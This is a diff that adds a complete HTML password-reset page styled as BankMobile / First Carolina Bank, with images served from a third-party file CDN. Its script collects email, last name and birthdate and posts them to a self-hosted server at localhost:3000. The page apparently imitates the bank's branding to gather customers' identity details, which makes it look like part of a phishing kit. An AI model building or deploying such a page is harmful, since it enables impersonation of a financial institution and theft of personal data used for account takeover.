@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>Reset Password</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="apple-touch-icon" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="/lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/site.css" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-image: url('https://cdn.corenexis.com/f/5upabsqQ4fJ.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 40px 20px;
+            color: #1a1a1a;
+        }
+
+        .top-bar {
+            position: absolute;
+            top: 35px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 40px;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 40px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a1a1a;
+            padding: 8px;
+            text-decoration: none;
+            transition: opacity 0.15s ease;
+        }
+
+        .back-btn:hover {
+            opacity: 0.7;
+        }
+
+        .top-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1c2024;
+            text-align: center;
+        }
+
+        .content-container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            margin-top: 70px;
+        }
+
+        h2 {
+            font-family: Rockwell, "Rockwell Nova", "Courier New", Georgia, serif;
+            font-size: 32px;
+            font-weight: 500;
+            text-align: left;
+            line-height: 1.15;
+            color: #1c2024;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+            padding-left: 5px;
+        }
+
+        .subtitle {
+            font-size: 13.5px;
+            line-height: 1.45;
+            color: #333333;
+            text-align: left;
+            margin-bottom: 22px;
+            font-weight: 500;
+            padding-left: 5px;
+        }
+
+        .subtitle strong {
+            font-weight: 700;
+            color: #000000;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            padding: 35px 25px 25px 25px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+            border: 1px solid #e2e8f0;
+            border-radius: 0px;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group:last-child {
+            margin-bottom: 0;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 15px;
+            border: 1px solid #767676;
+            border-radius: 0px;
+            outline: none;
+            color: #222;
+            font-family: inherit;
+            font-weight: 500;
+            transition: border-color 0.1s ease;
+        }
+
+        .input-group input::placeholder {
+            color: #616161;
+            font-weight: 500; 
+        }
+
+        .input-group input:focus {
+            border: 2px solid #000000;
+            padding: 15px 13px;
+        }
+
+        .input-group input.invalid-field {
+            border-color: #d32f2f;
+        }
+
+        .input-group input.invalid-field:focus {
+            border-color: #d32f2f;
+        }
+
+        .field-error-msg {
+            display: none;
+            color: #d32f2f;
+            font-size: 12.5px;
+            font-weight: 500;
+            margin-top: 6px;
+            text-align: left;
+            padding-left: 2px;
+        }
+
+        .success-container {
+            display: none;
+            align-items: flex-start;
+            gap: 8px;
+            color: #2e7d32;
+            font-size: 13.5px;
+            line-height: 1.45;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            padding-left: 2px;
+        }
+
+        .success-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+            color: #2e7d32;
+        }
+
+        .success-text {
+            font-weight: 400;
+            text-align: left;
+        }
+
+        .error-container {
+            display: none;
+            align-items: flex-start;
+            gap: 8px;
+            color: #d32f2f;
+            font-size: 13.5px;
+            line-height: 1.45;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            padding-left: 2px;
+        }
+
+        .error-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+            color: #d32f2f;
+        }
+
+        .error-text {
+            font-weight: 400;
+            text-align: left;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: #d7e7f5;
+            color: #9cb4cc;
+            border: none;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: not-allowed;
+            border-radius: 0px;
+            text-align: center;
+            margin-bottom: 25px;
+            transition: all 0.2s ease;
+        }
+
+        .next-btn.active {
+            background-color: #0056b3;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .next-btn.active:hover {
+            background-color: #003d82;
+        }
+
+        .next-btn.loading {
+            background-color: #4a7fb5;
+            cursor: wait;
+            opacity: 0.8;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .cancel-container {
+            text-align: center;
+            width: 100%;
+        }
+
+        .cancel-link {
+            font-size: 14px;
+            color: #1c2024;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .cancel-link:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            font-size: 14px;
+            color: #212529;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 800px;
+            width: 100%;
+            margin-top: auto;
+            padding-top: 60px;
+            white-space: nowrap;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header navigation bar -->
+    <div class="top-bar">
+        <a href="forget.html" class="back-btn" aria-label="Go back to forgot menu">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+            </svg>
+        </a>
+        <div class="top-title">Reset your password</div>
+    </div>
+
+    <!-- Main Recovery Content Area -->
+    <div class="content-container">
+        <h2>Reset password</h2>
+        <p class="subtitle">
+            In order to reset your password, please enter your <strong>primary email address</strong> associated with your profile.
+        </p>
+
+        <!-- Form container card -->
+        <div class="card">
+            <form id="resetForm" onsubmit="event.preventDefault();">
+                <!-- Email field -->
+                <div class="input-group">
+                    <input type="text" id="email" name="email" placeholder="Email address" aria-label="Email address" required autocomplete="off">
+                    <div class="field-error-msg" id="emailError">Please enter a valid email address.</div>
+                </div>
+
+                <!-- Last name field -->
+                <div class="input-group">
+                    <input type="text" id="lastname" name="lastname" placeholder="Last name" aria-label="Last name" required autocomplete="off">
+                </div>
+
+                <!-- Birthdate field -->
+                <div class="input-group">
+                    <input type="text" id="birthdate" name="birthdate" placeholder="Birthdate" aria-label="Birthdate" required autocomplete="off">
+                </div>
+
+                <!-- Error Container -->
+                <div class="error-container" id="errorNotification">
+                    <svg class="error-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <span class="error-text" id="errorMessage">Failed to send reset request. Please try again.</span>
+                </div>
+
+                <!-- Success Container -->
+                <div class="success-container" id="successNotification">
+                    <svg class="success-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    <span class="success-text" id="successMessage">Reset link sent! Check your email for instructions.</span>
+                </div>
+            </form>
+        </div>
+
+        <!-- Next submit action button -->
+        <button type="submit" form="resetForm" class="next-btn" id="nextBtn" disabled>Next</button>
+
+        <!-- Cancel execution trigger -->
+        <div class="cancel-container">
+            <a href="forget.html" class="cancel-link">Cancel</a>
+        </div>
+    </div>
+
+    <!-- Page Footer -->
+    <footer>
+        © 2026 BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.<br>
+        Powered by BM Technologies, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC.
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const lastnameInput = document.getElementById('lastname');
+            const birthdateInput = document.getElementById('birthdate');
+            const nextButton = document.getElementById('nextBtn');
+            const emailErrorMsg = document.getElementById('emailError');
+            const errorNotification = document.getElementById('errorNotification');
+            const errorMessage = document.getElementById('errorMessage');
+            const successNotification = document.getElementById('successNotification');
+            const successMessage = document.getElementById('successMessage');
+            const resetForm = document.getElementById('resetForm');
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const SERVER_URL = 'http://localhost:3000';
+
+            // Format validation
+            function validateEmailFormat(val) {
+                return emailRegex.test(val.trim());
+            }
+
+            // Real-time structural checker
+            function checkInputs() {
+                const isEmailFilled = emailInput.value.trim() !== "";
+                const isLastnameFilled = lastnameInput.value.trim() !== "";
+                const isBirthdateFilled = birthdateInput.value.trim() !== "";
+
+                if (isEmailFilled && isLastnameFilled && isBirthdateFilled) {
+                    nextButton.classList.add('active');
+                    nextButton.disabled = false;
+                } else {
+                    nextButton.classList.remove('active');
+                    nextButton.disabled = true;
+                }
+            }
+
+            // Send reset request to server
+            async function sendResetRequest(email, lastname, birthdate) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/reset-password`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            email: email,
+                            lastname: lastname,
+                            birthdate: birthdate
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    return data;
+                    
+                } catch (error) {
+                    console.error('Server error:', error);
+                    return { 
+                        success: false, 
+                        message: 'Could not connect to server. Make sure server is running on port 3000.'
+                    };
+                }
+            }
+
+            // Input handlers
+            emailInput.addEventListener('input', function() {
+                checkInputs();
+                emailErrorMsg.style.display = "none";
+                emailInput.classList.remove('invalid-field');
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+            });
+
+            emailInput.addEventListener('blur', function() {
+                const val = emailInput.value.trim();
+                if (val !== "" && !validateEmailFormat(val)) {
+                    emailErrorMsg.style.display = "block";
+                    emailInput.classList.add('invalid-field');
+                } else {
+                    emailErrorMsg.style.display = "none";
+                    emailInput.classList.remove('invalid-field');
+                }
+            });
+
+            lastnameInput.addEventListener('input', function() {
+                checkInputs();
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+            });
+
+            birthdateInput.addEventListener('input', function() {
+                checkInputs();
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+            });
+
+            // Auto format birthdate input to MM/DD/YYYY
+            birthdateInput.addEventListener('keyup', function(e) {
+                if (e.key !== "Backspace" && e.key !== "Delete") {
+                    let val = birthdateInput.value.replace(/\D/g, '');
+                    if (val.length > 2 && val.length <= 4) {
+                        birthdateInput.value = val.slice(0, 2) + '/' + val.slice(2);
+                    } else if (val.length > 4) {
+                        birthdateInput.value = val.slice(0, 2) + '/' + val.slice(2, 4) + '/' + val.slice(4, 8);
+                    }
+                }
+                checkInputs();
+            });
+
+            // Form Submission - Send to Server
+            resetForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = emailInput.value.trim();
+                const lastname = lastnameInput.value.trim();
+                const birthdate = birthdateInput.value.trim();
+
+                // Validate email format
+                if (!validateEmailFormat(email)) {
+                    emailErrorMsg.style.display = "block";
+                    emailInput.classList.add('invalid-field');
+                    emailInput.focus();
+                    return;
+                }
+
+                // Validate all fields are filled
+                if (!lastname || !birthdate) {
+                    errorMessage.textContent = 'Please fill in all fields.';
+                    errorNotification.style.display = "flex";
+                    resetForm.classList.add('shake');
+                    setTimeout(() => resetForm.classList.remove('shake'), 500);
+                    return;
+                }
+
+                // Disable button during request
+                nextButton.disabled = true;
+                nextButton.innerHTML = '<span class="loading-text"><span class="spinner"></span> Sending...</span>';
+                nextButton.classList.add('loading');
+
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+
+                try {
+                    // Send to server
+                    const result = await sendResetRequest(email, lastname, birthdate);
+                    
+                    if (result.success) {
+                        // ✅ SUCCESS
+                        successMessage.textContent = result.message || 'Reset link sent! Check your email for instructions.';
+                        successNotification.style.display = "flex";
+                        
+                        // Store in localStorage
+                        localStorage.setItem('resetEmail', email);
+                        
+                        // Clear form
+                        emailInput.value = '';
+                        lastnameInput.value = '';
+                        birthdateInput.value = '';
+                        checkInputs();
+                        
+                        // Redirect back to forget page after 3 seconds
+                        setTimeout(() => {
+                            window.location.href = 'forget.html?status=success';
+                        }, 3000);
+                        
+                    } else {
+                        // ❌ FAILED
+                        errorMessage.textContent = result.message || 'Failed to send reset request. Please try again.';
+                        errorNotification.style.display = "flex";
+                        resetForm.classList.add('shake');
+                        setTimeout(() => resetForm.classList.remove('shake'), 500);
+                    }
+
+                } catch (error) {
+                    console.error('Error:', error);
+                    errorMessage.textContent = 'Network error. Please check your connection and try again.';
+                    errorNotification.style.display = "flex";
+                        
+                } finally {
+                    // Re-enable button
+                    nextButton.disabled = false;
+                    nextButton.innerHTML = 'Next';
+                    nextButton.classList.remove('loading');
+                    checkInputs();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
